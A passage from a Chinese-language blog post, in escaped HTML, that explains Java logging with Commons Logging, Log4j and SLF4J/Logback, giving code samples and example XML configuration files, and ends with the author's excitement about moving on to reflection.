&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">log&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;foo&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>在实例方法中引用&lt;code>Log&lt;/code>，通常定义一个实例变量&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 在实例方法中引用Log:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Log&lt;/span> &lt;span style="color:#111">log&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LogFactory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getLog&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">getClass&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">log&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;foo&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>上面展示了两种&lt;code>getLog()&lt;/code>的方式，第二种的好处是子类可以直接使用该实例，原因是Java的动态特性，子类获取的&lt;code>Log&lt;/code>字段实际上相当于&lt;code>LogFactory.getLog(Student.class)&lt;/code>，但却是从父类继承而来，并且无需改动代码&lt;/li>
&lt;/ul>
&lt;h3 id="log4j">Log4j&lt;/h3>
&lt;p>日志实现（乐）Log4j，我真的好喜欢你啊！为了你，我不要用无序列表了！！！&lt;/p>
&lt;p>Log4j是一个组件化设计的日志系统，它的架构大致如下&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220227012115179.png" alt="image-20220227012115179">&lt;/p>
&lt;p>当我们使用Log4j输出一条日志时，Log4j自动通过不同的Appender把同一条日志输出到不同的目的地&lt;/p>
&lt;ul>
&lt;li>console：输出到屏幕；&lt;/li>
&lt;li>file：输出到文件；&lt;/li>
&lt;li>socket：通过网络输出到远程计算机；&lt;/li>
&lt;li>jdbc：输出到数据库&lt;/li>
&lt;/ul>
&lt;p>通过Filter来过滤哪些log需要被输出，最后，通过Layout来格式化日志信息&lt;/p>
&lt;p>使用Log4j时只需把一个&lt;code>log4j2.xml&lt;/code>的文件放到&lt;code>classpath&lt;/code>下就可以让Log4j读取配置文件并按照我们的配置来输出日志&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;Configuration&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Properties&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- 定义日志格式 --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Property&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;log.pattern&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>%d{MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36}%n%msg%n%n&lt;span style="color:#f92672">&amp;lt;/Property&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- 定义文件名变量 --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Property&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;file.err.filename&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>log/err.log&lt;span style="color:#f92672">&amp;lt;/Property&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Property&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;file.err.pattern&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>log/err.%i.log.gz&lt;span style="color:#f92672">&amp;lt;/Property&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Properties&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- 定义Appender，即目的地 --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Appenders&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- 定义输出到屏幕 --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Console&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;console&amp;#34;&lt;/span> &lt;span style="color:#75af00">target=&lt;/span>&lt;span style="color:#d88200">&amp;#34;SYSTEM_OUT&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- 日志格式引用上面定义的log.pattern --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;PatternLayout&lt;/span> &lt;span style="color:#75af00">pattern=&lt;/span>&lt;span style="color:#d88200">&amp;#34;${log.pattern}&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Console&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- 定义输出到文件,文件名引用上面定义的file.err.filename --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;RollingFile&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;err&amp;#34;&lt;/span> &lt;span style="color:#75af00">bufferedIO=&lt;/span>&lt;span style="color:#d88200">&amp;#34;true&amp;#34;&lt;/span> &lt;span style="color:#75af00">fileName=&lt;/span>&lt;span style="color:#d88200">&amp;#34;${file.err.filename}&amp;#34;&lt;/span> &lt;span style="color:#75af00">filePattern=&lt;/span>&lt;span style="color:#d88200">&amp;#34;${file.err.pattern}&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;PatternLayout&lt;/span> &lt;span style="color:#75af00">pattern=&lt;/span>&lt;span style="color:#d88200">&amp;#34;${log.pattern}&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Policies&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- 根据文件大小自动切割日志 --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;SizeBasedTriggeringPolicy&lt;/span> &lt;span style="color:#75af00">size=&lt;/span>&lt;span style="color:#d88200">&amp;#34;1 MB&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Policies&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- 保留最近10份 --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;DefaultRolloverStrategy&lt;/span> &lt;span style="color:#75af00">max=&lt;/span>&lt;span style="color:#d88200">&amp;#34;10&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/RollingFile&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Appenders&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Loggers&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Root&lt;/span> &lt;span style="color:#75af00">level=&lt;/span>&lt;span style="color:#d88200">&amp;#34;info&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- 对info级别的日志，输出到console --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;AppenderRef&lt;/span> &lt;span style="color:#75af00">ref=&lt;/span>&lt;span style="color:#d88200">&amp;#34;console&amp;#34;&lt;/span> &lt;span style="color:#75af00">level=&lt;/span>&lt;span style="color:#d88200">&amp;#34;info&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- 对error级别的日志，输出到err，即上面定义的RollingFile --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;AppenderRef&lt;/span> &lt;span style="color:#75af00">ref=&lt;/span>&lt;span style="color:#d88200">&amp;#34;err&amp;#34;&lt;/span> &lt;span style="color:#75af00">level=&lt;/span>&lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Root&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Loggers&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/Configuration&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="slf4jlogback">SLF4J&amp;amp;Logback&lt;/h3>
&lt;p>类似上面那一对，做了些许改进&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">Commons Logging&lt;/th>
&lt;th style="text-align:left">SLF4J&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">org.apache.commons.logging.Log&lt;/td>
&lt;td style="text-align:left">org.slf4j.Logger&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">org.apache.commons.logging.LogFactory&lt;/td>
&lt;td style="text-align:left">org.slf4j.LoggerFactory&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>仍使用xml&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;configuration&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;appender&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;CONSOLE&amp;#34;&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;ch.qos.logback.core.ConsoleAppender&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;encoder&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;pattern&amp;gt;&lt;/span>%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n&lt;span style="color:#f92672">&amp;lt;/pattern&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/encoder&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/appender&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;appender&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;FILE&amp;#34;&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;ch.qos.logback.core.rolling.RollingFileAppender&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;encoder&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;pattern&amp;gt;&lt;/span>%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n&lt;span style="color:#f92672">&amp;lt;/pattern&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;charset&amp;gt;&lt;/span>utf-8&lt;span style="color:#f92672">&amp;lt;/charset&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/encoder&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;file&amp;gt;&lt;/span>log/output.log&lt;span style="color:#f92672">&amp;lt;/file&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;rollingPolicy&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;ch.qos.logback.core.rolling.FixedWindowRollingPolicy&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;fileNamePattern&amp;gt;&lt;/span>log/output.log.%i&lt;span style="color:#f92672">&amp;lt;/fileNamePattern&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/rollingPolicy&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;triggeringPolicy&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;ch.qos.logback.core.rolling.SizeBasedTriggeringPolicy&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;MaxFileSize&amp;gt;&lt;/span>1MB&lt;span style="color:#f92672">&amp;lt;/MaxFileSize&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/triggeringPolicy&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/appender&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;root&lt;/span> &lt;span style="color:#75af00">level=&lt;/span>&lt;span style="color:#d88200">&amp;#34;INFO&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;appender-ref&lt;/span> &lt;span style="color:#75af00">ref=&lt;/span>&lt;span style="color:#d88200">&amp;#34;CONSOLE&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;appender-ref&lt;/span> &lt;span style="color:#75af00">ref=&lt;/span>&lt;span style="color:#d88200">&amp;#34;FILE&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/root&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/configuration&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
&lt;p>学完基础语法的感觉是约等于同时复建了PHP+c+Python+NodeJS，虽说是速通，但是感觉触类旁通，很多东西都明白了（大概）&lt;/p>
&lt;p>6小时速通基础，今天就可以学反射和其它的高级用法了！就可以跟链子了！！！&lt;/p>
&lt;p>好耶！！！&lt;/p></description></item></channel></rss>